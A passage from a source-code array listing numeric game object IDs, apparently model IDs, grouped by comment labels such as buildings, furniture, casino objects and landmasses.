		1675, 1677, 3167, 3168, 3169, 3170, 3171, 3172, 3173, 3174, 3175, 3178, 3241, 3242, 3246,
		3250, 3253, 3283, 3284, 3285, 3303, 3304, 3305, 3306, 3307, 3308, 3309, 3310, 3311, 3312,
		3313, 3314, 3315, 3316, 3317, 3351, 3353, 3355, 3356, 3362, 3414, 3415, 3417, 3418, 3442,
		3443, 3444, 3445, 3446, 3449, 3454, 3455, 3456, 3457, 3464, 3466, 3483, 3484, 3485, 3486,
		3487, 3488, 3501, 3555, 3556, 3557, 3558, 3580, 3582, 3583, 3584, 3587, 3588, 3589, 3590,
		3595, 3596, 3597, 3598, 3599, 3600, 3601, 3602, 3603, 3604, 3605, 3606, 3607, 3608, 3609,
		3612, 3613, 3614, 3617, 3618, 3619, 3622, 3623, 3624, 3626, 3628, 3634, 3635, 3639,
		3640, 3641, 3644, 3646, 3648, 3649, 3651, 3653, 3655, 3661, 3676, 3677, 3678, 3684,
		3697, 3698, 3700, 3702, 3704, 3711, 3713, 3741, 3759, 3762, 3764, 3765, 3783, 3820, 3821,
		3822, 3823, 3824, 3825, 3826, 3827, 3828, 3829, 3830, 3842, 3843, 3844, 3845, 4178, 4861,
		4886, 5060, 5151, 5341, 5416, 5421, 5423, 5425, 5444, 5445, 5446, 5447, 5448, 5450, 5451,
		5452, 5453, 5461, 5462, 5475, 5476, 5520, 5626, 5642, 5643, 5655, 5656, 5722, 5723, 5775,
		5874, 5891, 5892, 5986, 6038, 6039, 6041, 6042, 6047, 6057, 6058, 6132, 6133, 6134, 6135,
		6136, 6137, 6138, 6284, 6285, 6286, 6294, 6436, 6522, 6868, 6920, 6921, 6922, 6923, 6926,
		7200, 7287, 7489, 7491, 7533, 7534, 7535, 7681, 7885, 7929, 7932, 7940, 8425, 8427, 8428,
		8433, 8437, 8513, 9098, 9220, 9221, 9227, 9228, 9238, 9258, 9259, 9270, 9271, 9272, 9273,
		9274, 9275, 9319, 9320, 9323, 9324, 9325, 9326, 9327, 9328, 9341, 9495, 9496, 9497,
		9498, 9499, 9500, 9501, 9502, 9503, 9504, 9506, 9507, 9509, 9510, 9511, 9512, 9513, 9515,
		9516, 9517, 9518, 9520, 9521, 9522, 9523, 9524, 9529, 9547, 9549, 9550, 9572, 9573, 9576,
		9577, 9578, 9579, 9580, 9581, 9592, 9598, 9599, 9737, 9738, 9739, 9740, 9741, 9742, 9748,
		9749, 9750, 9751, 9752, 9753, 9754, 9762, 9763, 9764, 9765, 9894, 9895, 9903, 9904, 9909,
		9916, 9920, 9927, 9947, 9948, 9952, 10013, 10014, 10015, 10016, 10017, 10019, 10020, 10021,
		10022, 10043, 10048, 10050, 10053, 10055, 10080, 10084, 10086, 10101, 10187, 10188, 10189,
		10278, 10287, 10289, 10306, 10427, 10634, 10988, 10989, 10990, 10991, 10992, 10993, 10995,
		10998, 11001, 11002, 11004, 11433, 11490, 11491, 11501, 11502, 11503, 12937, 12938, 12939,
		12940, 12991, 13681, 13687, 13694, 13695, 13696, 13697, 13701, 13721, 13724, 13729, 13746,
		13747, 13753, 13754, 13755, 13816, 14385, 14388, 14389, 14390, 14417, 14418, 14419, 14420,
		14421, 14422, 14423, 14424, 14425, 14426, 14427, 14428, 14429, 14430, 14431, 14471, 14474,
		14475, 14476, 14484, 14485, 14492, 14495, 14500, 14512, 14525, 14526, 14534, 14639, 14700,
		14701, 14702, 14703, 14706, 14707, 14708, 14709, 14710, 14711, 14712, 14713, 14714, 14717,
		14718, 14735, 14736, 14746, 14748, 14750, 14754, 14755, 14756, 14758, 14759, 14760, 14771,
		14801, 14803, 14859, 14865, 14889, 15041, 15046, 15048, 15054, 15055, 15058,
		15059, 16105, 16280, 16285, 16689, 17005, 17008, 17041, 17044, 17045, 17067, 17335, 17547,
		17549, 17551, 17552, 17553, 17554, 17555, 17560, 17562, 17573, 17575, 17679, 17690, 17697,
		17698, 17699, 17804, 17807, 17809, 17859, 17888, 17893, 17894, 17901, 17922, 17926,
		17928, 17934, 17944, 18230, 18258, 18259, 18267, //buildings, apartments
		3781, 4002, 4005, 4006, 4007, 4008, 4017, 4019, 4021, 4023, 4028, 4033, 4113, 4193,
		4558, 4559, 4564, 4569, 4570, 4571, 4572, 4573, 4576, 4585, 4586, 4587, 4600, 4601,
		4602, 4603, 4681, 4690, 4718, 5033, 5735, 5736, 5740, 5767, 5881, 5882, 5999, 6059, 6063,
		6087, 6088, 6099, 6100, 6102, 6148, 6159, 6199, 6205, 6211, 6212, 6288, 6332, 6336, 6342,
		6351, 6364, 6366, 6368, 6371, 6373, 6388, 6389, 6390, 6391, 6966, 6993, 7009, 7528, 7584,
		7585, 7696, 8391, 8392, 8393, 8419, 8421, 8422, 8424, 8434, 8480, 8482, 8485, 8488, 8489,
		8490, 8527, 8528, 8555, 8565, 8566, 8568, 9361, 9907, 9919, 10027, 10041, 10044, 10056, 10060,
		10063, 10143, 10308, 10610, 10619, 10676, 10871, 10945, 10947, 10948, 11431, 11566, 13006, 14593,
		14594, 14595, 14597, 14602, 16004, 16326, 17533, //offices and skyscrapers
		967, 1638, 1684, 3243, 3292, 3293, 3504, 3615, 3866, 3873, 3887, 3976, 3980, 3986, 3998, 4013,
		4014, 4079, 4101, 4103, 4552, 4554, 5116, 5402, 5403, 5408, 5426, 5705, 5706, 5708, 5710, 5711,
		5712, 5716, 5720, 5763, 5835, 5837, 5863, 5864, 5865, 5886, 6036, 6037, 6040, 6296, 6337, 6863,
		6864, 6866, 6871, 6872, 6873, 6874, 6875, 6962, 6994, 7011, 7023, 7027, 7094, 7511, 7525, 8034,
		84079, 8130, 8131, 8136, 8168, 8169, 8230, 8231, 8237, 8397, 8431, 8500, 8575, 8578, 8591,
		8620, 8675, 8867, 8870, 8881, 8882, 8955, 9037, 9039, 9052, 9078, 9106, 9114, 9310, 9593, 9623,
		9624, 9834, 9835, 9836, 9900, 9901, 9918, 9931, 9949, 9950, 9951, 10023, 10031, 10049, 10270,
		10368, 10377, 10378, 10379, 10380, 10381, 10401, 10433, 10631, 10829, 10832, 10941, 10942,
		11008, 11015, 11088, 11425, 11426, 11427, 11428, 11440, 11441, 11442, 11443, 11444, 11445,
		11446, 11447, 11451, 11454, 11457, 11458, 11459, 11492, 12805, 12925, 12928, 12929, 12935,
		12942, 12943, 12959, 12960, 12978, 12983, 13007, 13027, 13190, 13295, 13725, 14408, 14412,
		14413, 14415, 14444, 14445, 14447, 14466, 14530, 14576, 14592, 16095, 16096, 16137, 16138,
		16287, 16344, 16348, 16352, 16354, 16359, 16364, 16376, 16386, 16387, 16563, 16564, 16769,
		16770, 16774, 17688, 17946, 18033, 18036, 18045, 18049, 18065, 18234, 18235, 18236, 18274,
		18552, //other buildings
		3436, 3469, 4016, 4141, 4857, 4887, 4888, 5168, 5189, 5406, 5413, 5418, 5430, 5718, 5732,
		5814, 6010, 6257, 6283, 6907, 7037, 7240, 7387, 7389, 7426, 7509, 7596, 7972, 7973, 8409,
		8411, 8498, 8499, 8534, 8535, 8710, 9615, 9824, 9859, 9860, 9898, 10193, 10194, 10195, 10196,
		10197, 10310, 10412, 10425, 10446, 10606, 10718, 10744, 11469, 11549, 11674, 12924, 12976, 13361,
		14383, 14479, 14506, 14655, 14674, 14675, 15033, 15034, 15053, 16012, 16066, 16067,
		16070, 16106, 16143, 16144, 16562, 16568, 16605, 16673, 16767, 16781, 17534, 18009, 18020, 18021,
		18022, 18023, 18029, 18056, 18058, 18237, 18239, 18242, //resturant and hotels
		3452, 3453, 3819, 5390, 5400, 6066, 7416, 7417, 7420, 7421, 7422, 7600, 7601, 7602, 7603, 7604, 7617,
		7983, 8201, 8333, 8417, 10385, 10405, 10406, 10407, 10408, 10409, 10410, 10561, 10954, 10955,
		13595, 13598, 13599, 13602, 13603, 13606, 13607, 13608, 13609, 13610, 13611, 13612, 13613, 13614, 13615,
		13616, 13617, 13618, 13619, 13620, 13621, 13624, 13625, 13627, 13631, 13628, 13632, 13629, 13633, 13630,
		13642, 13650, 13651, 13657, 13661, 13662, 13659, 13660, 13801, 14449, 14486, 14488, 14778,
		14779, 14780, 14781, 14782, 14786, 14787, 14788, 14789, 14790, 14791, 14792, 14794, 14825, 14827, 17511,
		17513, 17515, 17563, 17582, 17841, //sports and stadium
		3988, 4001, 4004, 4011, 4018, 4048, 4058, 4059, 4060, 4112, 4114, 4117, 4123, 4176, 4555, 4593, 4594,
		4682, 4683, 4708, 4848, 4850, 4877, 4880, 4894, 5016, 5017, 5040, 5042, 5110, 5134, 5136, 5140, 5142, 5173,
		5179, 5181, 5182, 5187, 5267, 5392, 5393, 5410, 5414, 5521, 5532, 5628, 5704, 5709, 5717, 5719, 5721, 5725,
		5726, 5727, 5729, 5730, 5731, 5733, 5734, 5737, 5738, 5760, 5761, 5762, 5765, 5768, 5769, 5771, 5781, 5782,
		5784, 5787, 5792, 5810, 5813, 5819, 5848, 5870, 5896, 6048, 6053, 6060, 6061, 6095, 6096, 6098, 6103, 6104,
		6130, 6145, 6150, 6151, 6157, 6158, 6186, 6187, 6282, 6334, 6338, 6354, 6355, 6369, 6406, 6488, 6908, 6919,
		6924, 6944, 6946, 6947, 6977, 7088, 7234, 7424, 7493, 7506, 7507, 7508, 7510, 7526, 7529, 7531, 7554, 7599,
		7650, 7658, 7985, 8068, 8242, 8401, 8403, 8432, 8435, 8436, 8494, 8495, 8496, 8503, 8504, 8505, 8506, 8507,
		8508, 8509, 8516, 8567, 8569, 8570, 8571, 8581, 8639, 8643, 8668, 8687, 8688, 8689, 8839, 8842, 8849, 9054,
		9055, 9162, 9163, 9299, 9300, 9301, 9302, 9303, 9494, 9514, 9595, 9906, 9908, 9910, 9911, 9912, 9913, 9914,
		9917, 9921, 9922, 9923, 9924, 9925, 9926, 9928, 9929, 9953, 10025, 10028, 10030, 10035, 10037, 10038, 10039,
		10045, 10046, 10052, 10054, 10142, 10148, 10288, 10369, 10375, 10376, 10383, 10388, 10390, 10391, 10392, 10393,
		10423, 10428, 10429, 10430, 10431, 10432, 10434, 10435, 10439, 10441, 10447, 10624, 10625, 10626, 10627, 10628,
		10630, 10633, 10722, 10891, 10925, 10949, 10950, 10951, 10952, 10953, 10973, 10974, 10975, 10977, 10978, 10979,
		10980, 10981, 10982, 10994, 10996, 10997, 10999, 11000, 11092, 11301, 11312, 11314, 11315, 11317, 11434, 11436,
		11449, 11450, 11456, 11471, 11475, 11497, 11545, 11546, 11615, 12822, 12841, 12843, 12844, 12845, 12849, 12850,
		12855, 12862, 12863, 12923, 12944, 12945, 12946, 12947, 12948, 12949, 12951, 12953, 12962, 12963, 12964, 12979,
		12980, 12982, 12984, 13008, 13012, 13013, 13014, 13015, 13022, 13131, 13363, 13364, 13761, 14531, 14661, 14664,
		14665, 14667, 14670, 14671, 14672, 14676, 14682, 14689, 14668, 14669, 16005, 16007, 16011, 16053, 16054, 16064,
		16065, 16068, 16069, 16361, 16396, 16475, 17066, 17503, 17508, 17517, 17519, 17520, 17521, 17522, 17524, 17526,
		17529, 17531, 17536, 17537, 17542, 17543, 17544, 17577, 17853, 17862, 18007, 18008, 18025, 18026, 18027, 18030,
		18031, 18038, 18082, 18083, 18088, 18203, 18233, 18238, 18240, 18241, 18261, 18264, 18265, 18266,
		18282, //Stores and Shops
		1376, 1378, 1380, 1381, 1383, 1384, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 3474, 5126, 10825,
		11400, 11401, 11406, 16328, 16332, 16337, 16355, 16356, //cranes
		925, 930, 931, 944, 964, 1271, 1348, 1362, 1431, 1685, 2038, 2039, 2040, 2041, 2042, 2043, 2358, 2359, 2464, 2465,
		2466, 2468, 2476, 2477, 2478, 2479, 2480, 2481, 2483, 2567, 2654, 2669, 2678, 2679, 2694, 3565, 3566, 3568, 3569, 3570,
		3571, 3572, 3573, 3574, 3575, 3576, 3577, 3621, 3630, 3632, 3633, 3722, 3724, 3761, 3796, 3798, 3799, 3800, 5132, 5259,
		5260, 5261, 5262, 5269, 5855, 7025, 7040, 7102, 7104, 7172, 7186, 7317, 7515, 7516, 7527, 7561, 7620, 7621, 7622, 7834,
		7836, 8073, 8074, 8075, 8076, 8077, 8078, 8335, 8337, 8339, 8341, 8883, 8884, 8885, 8886, 9587, 9588, 9589, 9604, 10231,
		10248, 10576, 10773, 10774, 10811, 10814, 12821, 12859, 12860, 12861, 12913, 12927, 12930, 12955, 12977, 13025, 13489, 14549,
		14552, 14558, 14612, 14613, 14800, 14878, 16599, 16601, 17019, 17020, 17055, 18257, 18260, //crates drums racks
		914, 915, 919, 920, 927, 929, 934, 943, 958, 959, 1353, 1354, 1420, 1617, 1618, 1623, 1624, 1625, 1626, 1628, 1629, 1630, 1635,
		1687, 1688, 1689, 1690, 1691, 2649, 2653, 3214, 3255, 3256, 3257, 3258, 3259, 3272, 3273, 3287, 3384, 3427, 3470, 3502, 3529,
		3530, 3631, 3636, 3637, 3638, 3643, 3673, 3675, 3804, 3805, 3812, 3813, 3865, 6867, 6928, 6929, 6930, 6931, 6932, 6933, 6934,
		7024, 7103, 7105, 7201, 7236, 7238, 7291, 7947, 7950, 10675, 11147, 11148, 11149, 11484, 11485, 11486, 11487, 12911, 12912,
		12986, 14573, 14584, 14635, 14882, 16071, 16072, 16073, 16074, 16075, 16076, 16078, 16079, 16080, 16081, 16083, 16086, 16087,
		16267, 16301, 16309, 16311, 16314, 16316, 16318, 16340, 16342, 16345, 16346, 16349, 16395, 16446, 16481, 16530, 16531, 16532,
		16533, 16534, 16535, 16666, 16766, 17001, 18201, //general industrial
		1455, 1484, 1485, 1486, 1488, 1509, 1510, 1511, 1517, 1520, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1551,
		1664, 1665, 1666, 1667, 1668, 1669, 1732, 1950, 1951, 14565, 16151, 16152, //BAR ITEMS
		1515, 1830, 1831, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 1851, 1852, 1853, 1854, 1855, 1856, 1857, 1858, 1859, 1860, 1861,
		1862, 1863, 1864, 1865, 1866, 1867, 1868, 1869, 1870, 1871, 1872, 1873, 1874, 1875, 1876, 1877, 1878, 1879, 1880, 1881, 1882,
		1895, 1897, 1898, 1899, 1900, 1901, 1902, 1903, 1904, 1905, 1906, 1907, 1908, 1909, 1910, 1911, 1912, 1913, 1914, 1915, 1916,
		1917, 1918, 1919, 1920, 1921, 1922, 1923, 1924, 1925, 1926, 1927, 1928, 1929, 1930, 1931, 1932, 1933, 1934, 1935, 1936, 1937,
		1938, 1939, 1940, 1941, 1942, 1943, 1944, 1945, 1947, 1948, 1952, 1953, 1955, 1956, 1978, 1979, 2188, 2189, 2324, 2325, 2326,
		2327, 2347, 2348, 2349, 2618, 2640, 2681, 2754, 2778, 2779, 2783, 2785, 2872, 3430, 3437, 3438, 3440, 3441, 3494, 3498, 3499,
		3503, 14566, 14567, 14568, 14582, //CASINO OBJECTS
		936, 937, 941, 1416, 1417, 1421, 1645, 1646, 1647, 1730, 1740, 1741, 1742, 1743, 1744, 1754, 1755,
		1758, 1759, 1762, 1765, 1767, 1769, 1814, 1815, 1816, 1817, 1819, 1820, 1821, 1822, 1823,
		2000, 2007, 2014, 2015, 2016, 2018, 2019, 2020, 2021, 2022, 2024, 2025, 2046, 2063, 2065, 2066, 2067,
		2078, 2081, 2082, 2083, 2084, 2087, 2088, 2089, 2092, 2094, 2095, 2128, 2129, 2133, 2134, 2137,
		2140, 2141, 2142, 2143, 2145, 2148, 2151, 2152, 2153, 2154, 2155, 2156, 2157, 2158, 2159,
		2160, 2161, 2162, 2163, 2164, 2167, 2168, 2187, 2191, 2197, 2199, 2200, 2204, 2208, 2210, 2211, 2234,
		2235, 2236, 2291, 2292, 2295, 2303, 2304, 2305, 2306, 2307, 2323, 2328, 2329, 2330, 2334, 2335, 2338,
		2341, 2416, 2418, 2419, 2451, 2462, 2463, 2475, 2482, 2502, 2509, 2529, 2530, 2531, 2532, 2533, 2534,
		2562, 2568, 2569, 2570, 2573, 2574, 2576, 2591, 2604, 2606, 2608, 2609, 2610, 2708, 2737, 5171, 9362,
		11334, 13003, 13890, 14455, 14472, 14477, 14491, 14493, 14502, 14503, 14504, 14505, 14507, 14508, 14509,
		14510, 14535, 14540, 14543, 14544, 14556, 14632, 14633, 14640, 14704, 14719, 14720, 14721, 14739, 14741,
		14745, 14802, 14805, 14813, 14816, 14817, 14828, 14839, 14850, 14888, 14895, 15025, 15026, 15032, 15036,
		15052, 16154, 16378, 18019, 18077, //FURNITURE
		1513, 1514, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 1849, 1850, 1883, 1884, 1885, 1886, 1887, 1888, 1889,
		1890, 1891, 1959, 1972, 1973, 1981, 1982, 1983, 1984, 1986, 1987, 1988, 1989, 1990, 1991, 1992, 1993, 1994,
		1995, 1996, 2012, 2362, 2365, 2366, 2367, 2368, 2369, 2375, 2376, 2379, 2385, 2387, 2388, 2393, 2403, 2412,
		2413, 2414, 2422, 2423, 2424, 2433, 2434, 2435, 2436, 2439, 2440, 2441, 2442, 2443, 2444, 2445, 2446, 2447,
		2448, 2449, 2450, 2454, 2455, 2457, 2458, 2459, 2460, 2461, 2467, 2484, 2485, 2486, 2487, 2488, 2489, 2490,
		2491, 2492, 2493, 2494, 2495, 2496, 2497, 2498, 2499, 2500, 2505, 2506, 2507, 2508, 2535, 2536, 2537, 2538,
		2539, 2540, 2541, 2542, 2543, 2544, 2545, 2546, 2547, 2548, 2549, 2550, 2551, 2552, 2553, 2554, 2555, 2556,
		2557, 2577, 2578, 2579, 2581, 2582, 2583, 2584, 2585, 2586, 2589, 2590, 2593, 2594, 2597, 2598, 2601, 2620,
		2621, 2622, 2623, 2624, 2625, 2626, 2652, 2698, 2699, 2701, 2749, 2750, 2751, 2752, 2753, 2771, 2803, 2804,
		2805, 2806, 2871, 12854, 14403, 14650, 14651, 14652, 14653, 14654, 14660, 14666, 14678, 14679, 14685, 14686,
		14693, 14811, 14890, 18061, 18064, 18070, 18092, //shop items
		643, 1256, 1280, 1281, 1368, 1432, 1433, 1516, 1562, 1563, 1663, 1670, 1671, 1679, 1704, 1705, 1708,
		1711, 1714, 1715, 1716, 1720, 1721, 1722, 1723, 1724, 1726, 1727, 1728, 1729, 1735, 1739, 1746, 1805, 1806,
		1810, 1811, 1824, 1825, 1826, 1827, 1896, 1954, 1957, 1963, 1968, 1969, 1970, 1998, 1999, 2008, 2009, 2027,
		2079, 2096, 2120, 2122, 2123, 2124, 2125, 2165, 2166, 2169, 2171, 2172, 2173, 2174, 2175, 2180, 2181,
		2182, 2183, 2184, 2185, 2193, 2198, 2205, 2206, 2207, 2209, 2293, 2308, 2309, 2310, 2311, 2313, 2314, 2315,
		2319, 2321, 2343, 2346, 2350, 2356, 2370, 2592, 2605, 2607, 2635, 2636, 2637, 2638, 2639, 2644, 2723, 2724,
		2725, 2746, 2747, 2748, 2762, 2763, 2764, 2776, 2777, 2784, 2788, 2799, 2800, 2801, 2802, 2807, 2808, 3383,
		3657, 3752, 11631, 11665, 12842, 14401, 14405, 14458, 14490, 14619, 14620, 14657, 14770, 14810, 14833, 14837,
		14869, 18055, 18057, 18059, 18060, //tables & chairs
		3975, 3977, 3978, 3981, 3982, 3983, 3984, 3985, 3987, 3989, 3997, 4000, 4010, 4012, 4020, 4027, 4029, 4030,
		4109, 4110, 4122, 4186, 4197, 4198, 4551, 4556, 4562, 4568, 4584, 4590, 4604, 4643, 4700, 4703, 4712, 4806,
		4811, 4812, 4813, 4814, 4858, 4873, 4879, 5105, 5107, 5111, 5122, 5123, 5144, 5185, 5186, 5270, 5273, 5274,
		5279, 5311, 5342, 5343, 5355, 5404, 5419, 5420, 5459, 5474, 5518, 5519, 5652, 5739, 5741, 5815, 5823, 5845,
		5857, 6064, 6101, 6152, 6160, 6165, 6213, 6217, 6227, 6280, 6281, 6293, 6297, 6312, 6313, 6343, 6347, 6398,
		6416, 6417, 6443, 6497, 6882, 6883, 6884, 6885, 6979, 7044, 7045, 7046, 7047, 7048, 7049, 7050, 7051,
		7098, 7099, 7100, 7101, 7203, 7217, 7218, 7247, 7248, 7249, 7250, 7251, 7252, 7253, 7254, 7357, 7448, 7449,
		7450, 7451, 7452, 7453, 7454, 7455, 7456, 7460, 7462, 7463, 7464, 7465, 7466, 7467, 7468, 7469, 7470, 7471,
		7472, 7473, 7474, 7530, 7553, 7557, 7588, 7882, 7889, 7994, 7996, 7997, 7999, 8000, 8001, 8003, 8004, 8005,
		8006, 8033, 8037, 8071, 8133, 8198, 8199, 8202, 8228, 8232, 8264, 8283, 8288, 8306, 8351, 8352, 8353, 8398,
		8402, 8404, 8463, 8465, 8466, 8467, 8469, 8486, 8497, 8515, 8529, 8531, 8533, 8553, 8554, 8564, 8582, 8583,
		8584, 8585, 8661, 8664, 8671, 8672, 8677, 8844, 8850, 8857, 8859, 9047, 9056, 9057, 9062, 9064, 9065, 9066,
		9083, 9135, 9136, 9137, 9138, 9139, 9140, 9173, 9209, 9215, 9216, 9223, 9224, 9234, 9236, 9246, 9249, 9254,
		9255, 9256, 9261, 9284, 9285, 9286, 9287, 9288, 9289, 9290, 9291, 9304, 9306, 9309, 9311, 9312, 9313, 9315,
		9338, 9342, 9346, 9351, 9483, 9505, 9508, 9530, 9551, 9552, 9553, 9597, 9830, 9864, 9915, 9946, 10036, 10047,
		10083, 10242, 10274, 10350, 10351, 10352, 10353, 10354, 10355, 10370, 10371, 10372, 10373, 10374, 10382, 10387,
		10389, 10395, 10399, 10404, 10413, 10436, 10438, 10443, 10559, 10563, 10564, 10565, 10566, 10567, 10568,
		10569, 10570, 10571, 10608, 10609, 10635, 10850, 10865, 10936, 10938, 10943, 10946, 10969, 10976, 11005, 11006,
		11013, 11082, 11083, 11139, 11287, 11288, 11367, 11420, 11429, 11430, 11488, 11506, 11507, 11508, 11511, 11512,
		11513, 11517, 11518, 11519, 11522, 11523, 11525, 11526, 11527, 11528, 11529, 11531, 11532, 11533, 11535, 11542,
		11553, 11559, 11629, 11647, 12823, 12870, 12908, 12926, 12952, 12969, 13083, 13103, 13106, 13134, 13135, 13136,
		13144, 13145, 13146, 13171, 13175, 13176, 13178, 13179, 13213, 13214, 13486, 13675, 13804, 13805, 13813, 13820,
		16055, 16056, 16057, 16058, 16059, 16097, 16102, 16103, 16109, 16147, 16148, 16149, 16157, 16158, 16159, 16160,
		16161, 16162, 16163, 16164, 16165, 16166, 16167, 16168, 16169, 16170, 16171, 16172, 16173, 16174, 16175, 16176,
		16177, 16178, 16179, 16180, 16181, 16182, 16184, 16185, 16186, 16187, 16188, 16189, 16190, 16191, 16192, 16193,
		16195, 16196, 16197, 16199, 16200, 16201, 16203, 16204, 16205, 16206, 16207, 16208, 16209, 16211, 16212, 16213,
		16214, 16215, 16216, 16217, 16218, 16219, 16220, 16221, 16222, 16224, 16225, 16226, 16227, 16228, 16229, 16230,
		16231, 16232, 16234, 16235, 16236, 16237, 16239, 16240, 16241, 16242, 16243, 16244, 16245, 16246, 16247, 16248,
		16249, 16250, 16251, 16252, 16253, 16254, 16255, 16256, 16257, 16258, 16259, 16260, 16261, 16262, 16263, 16264,
		16397, 16421, 16422, 16423, 16424, 16593, 16693, 16694, 17079, 17080, 17082, 17085, 17086, 17087, 17089, 17092,
		17104, 17105, 17121, 17123, 17124, 17125, 17127, 17128, 17134, 17135, 17472, 17500, 17506, 17507, 17541, 17545,
		17559, 17567, 17568, 17619, 17633, 17645, 17677, 17685, 17689, 17892, 17906, 18293, 18294, 18295, 18296, 18297,
		18298, 18299, 18300, 18301, 18302, 18303, 18304, 18305, 18306, 18307, 18308, 18309, 18310, 18311, 18312, 18313,
		18314, 18315, 18316, 18317, 18318, 18319, 18320, 18321, 18324, 18325, 18326, 18327, 18328, 18329, 18330, 18335,
		18336, 18337, 18342, 18346, 18347, 18348, 18349, 18353, 18355, 18360, 18361, 18362, 18363, 18364,
		18469, //concrete and rock landmasses
		3522, 4701, 4702, 4810, 4815, 4842, 4843, 4844, 4845, 4847, 4851, 4852, 4859, 4875, 4876, 4897, 4898, 5036, 5114,
		5172, 5424, 5427, 5428, 5429, 5443, 5457, 5458, 5471, 5624, 5640, 5743, 5812, 5871, 5875, 5878, 5887, 5987, 6006,
		6007, 6065, 6094, 6203, 6233, 6234, 6236, 6315, 6356, 6487, 7032, 7353, 7359, 7457, 7458, 7459, 7461, 7475, 7536,
		7537, 7579, 7582, 7616, 7998, 8002, 8007, 8008, 8072, 8091, 8200, 8459, 8460, 8461, 8462, 8468, 8532, 8654, 8655,
		8868, 8983, 9046, 9082, 9086, 9087, 9206, 9207, 9208, 9210, 9211, 9212, 9213, 9214, 9217, 9218, 9219, 9225, 9226,
		9235, 9242, 9248, 9276, 9305, 9345, 9353, 9519, 9554, 9555, 9556, 9596, 9605, 9606, 9607, 9609, 9610, 9611, 9614,
		9616, 9617, 9863, 9889, 9891, 9930, 10034, 10087, 10151, 10273, 10290, 10358, 10384, 10386, 10400, 10403, 10411, 10414,
		10415, 10416, 10417, 10418, 10419, 10420, 10421, 10422, 10451, 10453, 10454, 10491, 10492, 10560, 10562, 10601, 10612,
		10613, 10616, 10618, 10637, 10638, 10694, 10851, 10861, 10862, 10863, 10864, 10903, 10904, 10905, 10917, 10926, 10939,
		10959, 10960, 10961, 10962, 10972, 10983, 11097, 11106, 11107, 11223, 11224, 11225, 11226, 11297, 11303, 11332, 11335,
		11340, 11362, 11363, 11364, 11408, 11509, 11510, 11514, 11515, 11516, 11520, 11521, 11524, 11530, 11537, 11538, 11539,
		11540, 11541, 11552, 11554, 11555, 11557, 11560, 11628, 12804, 12814, 12824, 12825, 12864, 12865, 12866, 12868, 12869,
		12871, 12872, 12916, 12989, 13017, 13019, 13021, 13030, 13035, 13036, 13039, 13040, 13041, 13042, 13043, 13044, 13049,
		13050, 13051, 13070, 13071, 13072, 13081, 13082, 13084, 13099, 13100, 13101, 13102, 13104, 13105, 13107, 13120, 13121,
		13122, 13123, 13124, 13125, 13126, 13147, 13148, 13149, 13150, 13156, 13157, 13158, 13163, 13165, 13167, 13172, 13177,
		13180, 13181, 13207, 13208, 13209, 13210, 13211, 13212, 13235, 13236, 13237, 13297, 13370, 13371, 13490, 13679, 13686,
		13691, 13692, 13698, 13700, 13702, 13710, 13711, 13715, 13716, 13719, 13723, 13734, 13737, 13740, 13741, 13742, 13756,
		13757, 13795, 13809, 13818, 13821, 13823, 13824, 13825, 13826, 13871, 13872, 16183, 16194, 16198, 16202, 16210, 16233,
		16238, 16684, 16685, 17075, 17081, 17083, 17084, 17088, 17090, 17091, 17093, 17094, 17095, 17096, 17097, 17098, 17099,
		17100, 17101, 17102, 17103, 17106, 17107, 17108, 17109, 17113, 17114, 17115, 17116, 17117, 17118, 17119, 17122, 17126,
		17129, 17130, 17131, 17132, 17133, 17136, 17137, 17138, 17139, 17140, 17141, 17142, 17143, 17144, 17145, 17301, 17302,
		17471, 17548, 17574, 17589, 17594, 17601, 17614, 17615, 17616, 17617, 17618, 17620, 17664, 17665, 17678, 17691, 17696,
		17864, 17865, 17866, 17877, 17878, 17880, 17881, 18231, 18322, 18323, 18331, 18332, 18333, 18334, 18338, 18339, 18340,
		18341, 18343, 18344, 18345, 18350, 18351, 18352, 18354, 18356, 18357, 18358, 18359, 18473, 18475, 18485, //grass and dirt landmasses
		955, 956, 1209, 1302, 1775, 1776, 1977, 2212, 2213, 2214, 2215, 2216, 2217, 2218, 2219, 2220, 2221, 2222, 2223, 2342,
		2353, 2354, 2355, 2420, 2425, 2427, 2429, 2438, 2453, 2647, 2663, 2683, 2702, 2703, 2767, 2768, 2769, 2814, 2821, 2823,
		2837, 2838, 2839, 2840, 2856, 2857, 2858, 2859, 2860, 2861, 2866, 2867, 2880, 2881, //food and drinks
		1426, 1428, 1436, 1437, 1464, 1465, 1466, 1467, 1469, 1470, 1471, 1473, 1474, 1475, 1476, 1477, 1519, 1521, 1656,
		1698, 2633, 3361, 3399, 3671, 3674, 3867, 4106, 4120, 4121, 4170, 4171, 4180, 4231, 4565, 4575, 4737, 4738, 4824, 4881,
		4882, 5268, 5301, 5308, 5627, 5822, 7659, 8572, 8580, 8613, 8614, 8615, 9316, 9484, 9566, 9618, 9767, 9814,
		9815, 9816, 10008, 10026, 10033, 10042, 10152, 10153, 10173, 10174, 10175, 10176, 10177, 10178, 10179, 10180, 10181,
		10185, 10234, 10309, 10672, 11472, 11479, 11493, 11496, 11544, 12839, 12950, 12958, 12985, 12987, 13011, 13644, 13749, 14387,
		14394, 14395, 14407, 14409, 14410, 14411, 14414, 14416, 14596, 14874, 14877, 16082, 16322, 16649, 16651, 16661, 16731, 17904,
		18366, 18368, //Ladders,Stairs, and Scaffolding
		3268, 3271, 3277, 3279, 3280, 3386, 3387, 3388, 3389, 3390, 3391, 3392, 3393, 3394, 3395, 3396, 3400, 3401, 3786, 3787,
		3788, 3789, 3790, 3791, 3792, 3793, 3794, 3795, 3797, 3885, 16093, 16639, 16640, 16641, 16642, 16643, 16644, 16645,
		16647, 16648, 16654, 16656, 16657, 16658, 16660, 16662, 16663, 16665, 16681, 16682, //industrial Military
		918, 1217, 1218, 1222, 1244, 1676, 1686, 1985, 3057, 3267, 3426, 3472, 3525,
		3534, 3743, 3864, 3877, 6965, 7073, 7268, 7388, 7392, 8483, 8491, 8492, 8980, 9831, 9833, 10397,
		10764, 11417, 13562, 13667, 16135, 16368, 16777, 16778, 16779, 16782, //industrial Special
		1211, 1214, 1215, 1216, 1223, 1257, 1258, 1262, 1263, 1269, 1270, 1278, 1283, 1284, 1285, 1286,
		1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1306, 1307, 1308, 1315, 1319, 1340, 1341, 1342, 1346,
